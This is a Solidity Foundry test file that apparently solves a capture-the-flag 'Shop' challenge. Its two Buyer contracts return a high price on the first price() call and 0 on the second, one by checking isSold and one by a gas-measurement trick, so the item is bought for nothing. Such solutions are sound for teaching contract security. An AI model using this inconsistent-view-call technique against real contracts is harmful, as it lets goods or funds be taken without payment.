// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "./ShopFactory.sol";

contract ShopTest is Test, Buyer {
    ShopFactory factory;
    address shop;

    function setUp() public {
        factory = new ShopFactory();
        shop = factory.createInstance(address(this));
    }

    function price() external view returns (uint256) {
        if (Shop(shop).isSold()) {
            return 0;
        } else {
            return 200;
        }
    }

    function testShop() public {
        Shop(shop).buy();

        assertTrue(factory.validateInstance(payable(shop), address(this)));
    }
}

contract Shop2Test is Test, Buyer {
    ShopFactory factory;
    address shop;

    uint256 justcostGas;

    function setUp() public {
        factory = new ShopFactory();
        shop = factory.createInstance(address(this));
    }

    function price() external view returns (uint256) {
        uint256 gasleftBefore = gasleft();
        justcostGas + 1;
        if (gasleftBefore - gasleft() >= 2000) {
            return 200;
        } else {
            return 0;
        }
    }

    function testShop2() public {
        Shop(shop).buy();

        assertTrue(factory.validateInstance(payable(shop), address(this)));
    }
}
